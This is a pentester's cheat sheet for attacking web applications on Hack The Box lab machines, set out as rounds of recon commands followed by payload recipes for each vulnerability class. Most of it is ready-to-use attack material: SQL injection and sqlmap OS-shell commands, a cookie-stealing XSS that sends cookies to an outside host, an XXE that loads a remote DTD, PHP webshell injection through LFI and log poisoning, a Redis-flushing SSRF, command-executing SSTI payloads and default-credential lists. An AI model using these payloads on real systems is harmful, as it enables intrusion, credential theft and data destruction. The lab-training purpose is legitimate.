---
tags: [pentest, htb, web, walkthrough-pattern, both]
type: workflow
---
# Web-Heavy Box - Walkthrough Pattern

[[00 - README|Folder index]]

Boxes where the win lives in the web app for 80%+ of the engagement.

## Hallmarks

- Only ports 22 + 80/443 open (or just web)
- A real web app (not a default page)
- Multiple subdomains / vhosts
- A login form, an admin panel, an API

## Systematic web testing

### Round 1: Fingerprint

```bash
whatweb -v https://target.htb
curl -kI https://target.htb
curl -ks https://target.htb | grep -Ei 'generator|powered|version|comment'
nuclei -u https://target.htb -t technologies/ -t exposures/ -t default-logins/
```

### Round 2: Surface mapping

```bash
# Subdomain / vhost
ffuf -u https://target.htb -H "Host: FUZZ.target.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <baseline-size>

# After finding subdomains - directory brute each
gobuster dir -u https://app.target.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak -t 50 -k

# Don't skip recursion
feroxbuster -u https://app.target.htb --depth 3 -x php,html -t 50

# robots, sitemap, .well-known
curl -ks https://target.htb/robots.txt
curl -ks https://target.htb/sitemap.xml
curl -ks https://target.htb/.well-known/security.txt

# JS / API endpoint extraction
katana -u https://target.htb -jc -d 3 -o katana.txt
```

### Round 3: Parameter discovery

```bash
# Once you have a page that takes input but you don't know the parameter name
ffuf -u "https://target.htb/page?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <baseline>

# Or use Arjun / x8 / ParamSpider
arjun -u https://target.htb/page
```

### Round 4: Authenticated testing (when you find creds or default login)

Always check first:

- Default creds: `admin:admin`, `admin:password`, `root:root`, `test:test`, `guest:guest`
- "Welcome2024", "<Company>1!", "Password1", and seasonal variants
- Try cracked creds from any other service / artifact

## Vulnerability classes - quick test recipes

### SQL injection

```text
# Manual sanity test in every URL parameter and form field
'           # syntax error?
"           # syntax error?
\           # different error?
1 OR 1=1
1' OR 1=1-- -
1' UNION SELECT null,null,version()-- -
1' AND SLEEP(5)-- -        # blind / time-based
```

Then `sqlmap`:

```bash
# Save the request from Burp, use -r
sqlmap -r req.txt --batch --dbs
sqlmap -r req.txt --batch -D <db> --tables
sqlmap -r req.txt --batch -D <db> -T <tab> --dump

# Tougher targets
sqlmap -r req.txt --level=5 --risk=3 --tamper=space2comment,between
sqlmap -r req.txt --os-shell                  # if FILE / xp_cmdshell available
```

### XSS

```text
<script>alert(1)</script>
"><svg onload=alert(1)>
javascript:alert(1)
<img src=x onerror=alert(1)>

# Cookie steal
"><script>fetch('http://10.10.14.5/?c='+document.cookie)</script>
```

### LFI / Directory traversal

```text
?file=../../../../etc/passwd
?file=....//....//....//etc/passwd     # double-dot bypass
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/read=string.rot13/resource=index.php
?file=expect://id                       # if expect:// allowed
?file=data://text/plain,<?php system($_GET['c']);?>

# Log poisoning (if you can read access log AND pollute the User-Agent)
curl -A "<?php system(\$_GET['c']);?>" http://target/index
?file=/var/log/apache2/access.log&c=id
```

### Command injection

```text
; id
| id
|| id
& id
&& id
`id`
$(id)
%0aid           # url-encoded newline
```

Test each. Commix automates: `commix --url="..." --data="..."`.

### SSRF

```text
?url=http://127.0.0.1:22                # internal port probe
?url=http://169.254.169.254/...         # cloud metadata
?url=file:///etc/passwd
?url=gopher://127.0.0.1:6379/_FLUSHALL%0d%0a...    # SSRF to internal Redis

# DNS rebinding for IP-allowlisted filters: use a domain that returns 127.0.0.1 in DNS
```

### XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % ext SYSTEM "http://10.10.14.5/x.dtd"> %ext;]>
<foo>&exfil;</foo>
```

### File upload bypass

```text
Try in this order:
1. .php  with normal Content-Type           → blocked?
2. .php with image/jpeg Content-Type         → MIME check only?
3. shell.php.jpg / shell.jpg.php             → extension parsing
4. shell.phtml / shell.phar / shell.php7     → blacklist gap
5. shell.png with GIF89a; + <?php ... ?>     → magic byte check
6. Upload .htaccess: AddType application/x-httpd-php .jpg  → re-upload .jpg as PHP
7. Polyglot file (valid PNG + PHP appended)
8. Symlink upload (zip with symlink to /etc/passwd)
```

### Authentication weaknesses

| Test | Tool |
| --- | --- |
| Username enum via timing / error | manual + Burp Intruder |
| Default creds | hydra w/ `Default-Credentials/` |
| Weak password policy | hydra w/ rockyou top 100 |
| JWT alg confusion | jwt-cli decode → edit → resign |
| Session fixation | Burp - swap session before/after login |
| Password reset token predictable | Burp Sequencer |
| 2FA bypass via response manipulation | Burp Repeater on 2FA endpoint |

### IDOR

```text
Any numeric / GUID / username in URL or body:
   /api/user/1     → try /api/user/2, /api/user/0, /api/user/admin
   /api/order/<uuid>  → swap with own UUID
   X-User-Id: 100  → swap header
```

### Server-side template injection (SSTI)

```text
{{7*7}}            # if you see 49, you have SSTI
${7*7}
<%= 7*7 %>
${{<%[%'"}}%\

# Jinja2 (Python Flask)
{{ ''.__class__.__mro__[1].__subclasses__() }}        # discover classes
{{ config.items() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Twig (PHP)
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}

# ERB (Ruby)
<%= `id` %>
```

## Common JS framework gotchas

- **React/Vue/Angular SPAs:** No `view-source`, no useful HTML to dir-brute against. Read `main.js` / `chunk-*.js` directly - API endpoints, routes, and sometimes secrets are baked in.

```bash
# Extract URLs / endpoints / strings from JS
curl -ks https://target.htb/static/js/main.js | grep -oE '"/api/[^"]+"' | sort -u
curl -ks https://target.htb/static/js/main.js | grep -oE '(http|api|key|secret|token)' | head
```

- **GraphQL endpoint:** `/graphql`, `/api/graphql`, `/v1/graphql`. Test:

```bash
curl -X POST -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name } } }"}' https://target.htb/graphql
```

> [!tip] On web-heavy boxes
> Take everything in increments. Map → fuzz → test ONE vuln class at a time. Don't bounce between SQLi, XSS, and SSRF - finish each pass before moving on.
